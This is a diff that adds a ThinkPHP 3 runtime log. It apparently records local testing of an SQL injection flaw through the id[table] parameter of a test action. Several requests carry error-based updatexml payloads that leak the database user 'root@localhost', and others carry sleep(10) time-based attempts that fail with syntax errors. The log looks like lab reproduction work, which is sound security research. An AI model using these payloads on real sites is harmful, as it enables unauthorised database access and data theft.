@@ -1,0 +1,324 @@
+[ 2019-07-14T11:13:50+08:00 ] ::1 /tp3/
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000036s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000192s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000522s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000633s ]
+INFO: [ view_parse ] --START--
+INFO: [ template_filter ] --START--
+INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000079s ]
+INFO: [ template_filter ] --END-- [ RunTime:0.000235s ]
+INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.007132s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.007254s ]
+INFO: [ view_filter ] --START--
+INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000188s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.000283s ]
+INFO: [ app_end ] --START--
+INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000498s ]
+INFO: [ app_end ] --END-- [ RunTime:0.000599s ]
+
+[ 2019-07-14T11:15:00+08:00 ] ::1 /tp3/
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000126s ]
+INFO: [ app_init ] --END-- [ RunTime:0.002135s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000884s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.001056s ]
+INFO: [ view_parse ] --START--
+INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.000686s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.001088s ]
+INFO: [ view_filter ] --START--
+INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000674s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.001025s ]
+INFO: [ app_end ] --START--
+INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.001259s ]
+INFO: [ app_end ] --END-- [ RunTime:0.001517s ]
+
+[ 2019-07-14T13:02:15+08:00 ] ::1 /tp3/index.php
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000059s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000776s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000726s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000895s ]
+INFO: [ view_parse ] --START--
+INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.000688s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.000860s ]
+INFO: [ view_filter ] --START--
+INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000314s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.000475s ]
+INFO: [ app_end ] --START--
+INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000727s ]
+INFO: [ app_end ] --END-- [ RunTime:0.000868s ]
+
+[ 2019-07-14T13:02:32+08:00 ] ::1 /tp3/index.php?m=Home&c=Index&a=test
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000041s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000554s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000631s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000773s ]
+ERR: SQLSTATE[HY000] [2019] Unknown character set
+
+[ 2019-07-14T13:03:28+08:00 ] ::1 /tp3/index.php?m=Home&c=Index&a=test&id[table]=user%20where%201%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)--
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000024s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000382s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000608s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000710s ]
+ERR: SQLSTATE[HY000] [2019] Unknown character set
+
+[ 2019-07-14T13:05:33+08:00 ] ::1 /tp3/index.php?m=Home&c=Index&a=test&id[table]=user%20where%201%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)--
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000054s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000709s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000727s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000897s ]
+ERR: SQLSTATE[HY000] [2019] Unknown character set
+
+[ 2019-07-14T13:05:49+08:00 ] ::1 /tp3/index.php?m=Home&c=Index&a=test&id[table]=user%20where%201%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)--
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000049s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000879s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000702s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000852s ]
+ERR: SQLSTATE[HY000] [2019] Unknown character set
+
+[ 2019-07-14T13:06:01+08:00 ] ::1 /tp3/index.php?m=Home&c=Index&a=test&id[table]=user%20where%201%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)--
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000052s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000788s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000957s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.001103s ]
+SQL: SHOW COLUMNS FROM `user` [ RunTime:0.0055s ]
+ERR: 1105:XPATH syntax error: '~root@localhost~'
+ [ SQL语句 ] : SELECT * FROM user where 1 and updatexml(1,concat(0x7e,user(),0x7e),1)-- LIMIT 1  
+ERR: 1105:XPATH syntax error: '~root@localhost~'
+ [ SQL语句 ] : SELECT * FROM user where 1 and updatexml(1,concat(0x7e,user(),0x7e),1)-- LIMIT 1  
+
+[ 2019-07-14T13:47:57+08:00 ] ::1 /tp3/index.php?m=Home&c=Index&a=test&id[table]=user%20where%201%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)--
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000069s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000723s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000945s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.001328s ]
+SQL: SHOW COLUMNS FROM `user` [ RunTime:0.0040s ]
+ERR: 1105:XPATH syntax error: '~root@localhost~'
+ [ SQL语句 ] : SELECT * FROM user where 1 and updatexml(1,concat(0x7e,user(),0x7e),1)-- LIMIT 1  
+ERR: 1105:XPATH syntax error: '~root@localhost~'
+ [ SQL语句 ] : SELECT * FROM user where 1 and updatexml(1,concat(0x7e,user(),0x7e),1)-- LIMIT 1  
+
+[ 2019-07-14T14:23:13+08:00 ] ::1 /tp3/index.php?m=Home&c=Index&a=test&id[table]=11
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000068s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000743s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000526s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000763s ]
+SQL: SHOW COLUMNS FROM `user` [ RunTime:0.0031s ]
+ERR: 1064:You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '11 LIMIT 1' at line 1
+ [ SQL语句 ] : SELECT * FROM 11 LIMIT 1  
+ERR: 1064:You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '11 LIMIT 1' at line 1
+ [ SQL语句 ] : SELECT * FROM 11 LIMIT 1  
+
+[ 2019-07-14T14:23:13+08:00 ] ::1 /tp3/index.php?m=Home&c=Index&a=test&id[table]=11
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000076s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000861s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000530s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000789s ]
+SQL: SHOW COLUMNS FROM `user` [ RunTime:0.0020s ]
+ERR: 1064:You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '11 LIMIT 1' at line 1
+ [ SQL语句 ] : SELECT * FROM 11 LIMIT 1  
+ERR: 1064:You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '11 LIMIT 1' at line 1
+ [ SQL语句 ] : SELECT * FROM 11 LIMIT 1  
+
+[ 2019-07-14T14:49:26+08:00 ] ::1 /tp3/index.php?m=Home&c=Index&a=test&id[table]=1
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000033s ]
+INFO: [ app_init ] --END-- [ RunTime:0.001230s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.001346s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.001519s ]
+SQL: SHOW COLUMNS FROM `user` [ RunTime:0.0029s ]
+ERR: 1064:You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '1 LIMIT 1' at line 1
+ [ SQL语句 ] : SELECT * FROM 1 LIMIT 1  
+ERR: 1064:You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '1 LIMIT 1' at line 1
+ [ SQL语句 ] : SELECT * FROM 1 LIMIT 1  
+
+[ 2019-07-14T14:49:34+08:00 ] ::1 /tp3/index.php?m=Home&c=Index&a=test&id[table]=1%20--
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000034s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000489s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000484s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000593s ]
+SQL: SHOW COLUMNS FROM `user` [ RunTime:0.0023s ]
+ERR: 1064:You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '1 -- LIMIT 1' at line 1
+ [ SQL语句 ] : SELECT * FROM 1 -- LIMIT 1  
+ERR: 1064:You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '1 -- LIMIT 1' at line 1
+ [ SQL语句 ] : SELECT * FROM 1 -- LIMIT 1  
+
+[ 2019-07-14T14:49:47+08:00 ] ::1 /tp3/index.php?m=Home&c=Index&a=test&id[table]=1%20%20and%20sleep(10)--
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000023s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000390s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000462s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000591s ]
+SQL: SHOW COLUMNS FROM `user` [ RunTime:0.0014s ]
+ERR: 1064:You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '1  and sleep(10)-- LIMIT 1' at line 1
+ [ SQL语句 ] : SELECT * FROM 1  and sleep(10)-- LIMIT 1  
+ERR: 1064:You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '1  and sleep(10)-- LIMIT 1' at line 1
+ [ SQL语句 ] : SELECT * FROM 1  and sleep(10)-- LIMIT 1  
+
+[ 2019-07-14T14:50:00+08:00 ] ::1 /tp3/index.php?m=Home&c=Index&a=test&id[table]=1%20%27and%20sleep(10)--
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000043s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000728s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000504s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000603s ]
+SQL: SHOW COLUMNS FROM `user` [ RunTime:0.0016s ]
+ERR: 1064:You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '1 'and sleep(10)-- LIMIT 1' at line 1
+ [ SQL语句 ] : SELECT * FROM 1 'and sleep(10)-- LIMIT 1  
+ERR: 1064:You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '1 'and sleep(10)-- LIMIT 1' at line 1
+ [ SQL语句 ] : SELECT * FROM 1 'and sleep(10)-- LIMIT 1  
+
+[ 2019-07-14T14:50:07+08:00 ] ::1 /tp3/index.php?m=Home&c=Index&a=test&id[table]=1%20%27and%20sleep(10)
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000034s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000478s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000461s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000557s ]
+SQL: SHOW COLUMNS FROM `user` [ RunTime:0.0036s ]
+ERR: 1064:You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '1 'and sleep(10) LIMIT 1' at line 1
+ [ SQL语句 ] : SELECT * FROM 1 'and sleep(10) LIMIT 1  
+ERR: 1064:You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '1 'and sleep(10) LIMIT 1' at line 1
+ [ SQL语句 ] : SELECT * FROM 1 'and sleep(10) LIMIT 1  
+
+[ 2019-07-14T14:50:13+08:00 ] ::1 /tp3/index.php?m=Home&c=Index&a=test&id[table]=1%20%27and%20sleep(10)%3d
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000022s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000414s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000444s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000550s ]
+SQL: SHOW COLUMNS FROM `user` [ RunTime:0.0019s ]
+ERR: 1064:You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '1 'and sleep(10)= LIMIT 1' at line 1
+ [ SQL语句 ] : SELECT * FROM 1 'and sleep(10)= LIMIT 1  
+ERR: 1064:You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '1 'and sleep(10)= LIMIT 1' at line 1
+ [ SQL语句 ] : SELECT * FROM 1 'and sleep(10)= LIMIT 1  
+
+[ 2019-07-14T14:50:26+08:00 ] ::1 /tp3/index.php?m=Home&c=Index&a=test&id[table]=user%20%27and%20sleep(10)
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000022s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000377s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000422s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000520s ]
+SQL: SHOW COLUMNS FROM `user` [ RunTime:0.0022s ]
+ERR: 1064:You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''and sleep(10) LIMIT 1' at line 1
+ [ SQL语句 ] : SELECT * FROM user 'and sleep(10) LIMIT 1  
+ERR: 1064:You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''and sleep(10) LIMIT 1' at line 1
+ [ SQL语句 ] : SELECT * FROM user 'and sleep(10) LIMIT 1  
+
+[ 2019-07-14T14:50:32+08:00 ] ::1 /tp3/index.php?m=Home&c=Index&a=test&id[table]=user%20and%20sleep(10)
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000035s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000495s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000728s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000883s ]
+SQL: SHOW COLUMNS FROM `user` [ RunTime:0.0015s ]
+ERR: 1064:You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'and sleep(10) LIMIT 1' at line 1
+ [ SQL语句 ] : SELECT * FROM user and sleep(10) LIMIT 1  
+ERR: 1064:You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'and sleep(10) LIMIT 1' at line 1
+ [ SQL语句 ] : SELECT * FROM user and sleep(10) LIMIT 1  
+
+[ 2019-07-14T14:50:39+08:00 ] ::1 /tp3/index.php?m=Home&c=Index&a=test&id[table]=user%20and%20sleep(10)--
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000023s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000378s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000661s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000780s ]
+SQL: SHOW COLUMNS FROM `user` [ RunTime:0.0015s ]
+ERR: 1064:You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'and sleep(10)-- LIMIT 1' at line 1
+ [ SQL语句 ] : SELECT * FROM user and sleep(10)-- LIMIT 1  
+ERR: 1064:You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'and sleep(10)-- LIMIT 1' at line 1
+ [ SQL语句 ] : SELECT * FROM user and sleep(10)-- LIMIT 1  
+
+[ 2019-07-14T14:50:43+08:00 ] ::1 /tp3/index.php?m=Home&c=Index&a=test&id[table]=user%20and%20sleep(10)--+
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000023s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000372s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000419s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000524s ]
+SQL: SHOW COLUMNS FROM `user` [ RunTime:0.0016s ]
+ERR: 1064:You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'and sleep(10)-- LIMIT 1' at line 1
+ [ SQL语句 ] : SELECT * FROM user and sleep(10)-- LIMIT 1  
+ERR: 1064:You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'and sleep(10)-- LIMIT 1' at line 1
+ [ SQL语句 ] : SELECT * FROM user and sleep(10)-- LIMIT 1  
+
+[ 2019-07-14T14:50:48+08:00 ] ::1 /tp3/index.php?m=Home&c=Index&a=test&id[table]=user%20and%20sleep(10)--+
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000037s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000518s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000491s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000594s ]
+SQL: SHOW COLUMNS FROM `user` [ RunTime:0.0015s ]
+ERR: 1064:You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'and sleep(10)-- LIMIT 1' at line 1
+ [ SQL语句 ] : SELECT * FROM user and sleep(10)-- LIMIT 1  
+ERR: 1064:You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'and sleep(10)-- LIMIT 1' at line 1
+ [ SQL语句 ] : SELECT * FROM user and sleep(10)-- LIMIT 1  
+
+[ 2019-07-14T14:51:36+08:00 ] ::1 /tp3/index.php?m=Home&c=Index&a=test&id[table]=user%20and%20sleep(10)%35
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000022s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000369s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000431s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000534s ]
+SQL: SHOW COLUMNS FROM `user` [ RunTime:0.0016s ]
+ERR: 1064:You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'and sleep(10)5 LIMIT 1' at line 1
+ [ SQL语句 ] : SELECT * FROM user and sleep(10)5 LIMIT 1  
+ERR: 1064:You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'and sleep(10)5 LIMIT 1' at line 1
+ [ SQL语句 ] : SELECT * FROM user and sleep(10)5 LIMIT 1  
+
+[ 2019-07-14T14:51:57+08:00 ] ::1 /tp3/index.php?m=Home&c=Index&a=test&id[table]=user%20and%20sleep(10)
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000026s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000491s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000449s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000565s ]
+SQL: SHOW COLUMNS FROM `user` [ RunTime:0.0015s ]
+ERR: 1064:You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'and sleep(10) LIMIT 1' at line 1
+ [ SQL语句 ] : SELECT * FROM user and sleep(10) LIMIT 1  
+ERR: 1064:You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'and sleep(10) LIMIT 1' at line 1
+ [ SQL语句 ] : SELECT * FROM user and sleep(10) LIMIT 1  
+
+[ 2019-07-14T14:53:02+08:00 ] ::1 /tp3/index.php?m=Home&c=Index&a=test&id[table]=
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000025s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000573s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000451s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000554s ]
+SQL: SHOW COLUMNS FROM `user` [ RunTime:0.0019s ]
+ERR: 1103:Incorrect table name ''
+ [ SQL语句 ] : SELECT * FROM `` LIMIT 1  
+ERR: 1103:Incorrect table name ''
+ [ SQL语句 ] : SELECT * FROM `` LIMIT 1  
+
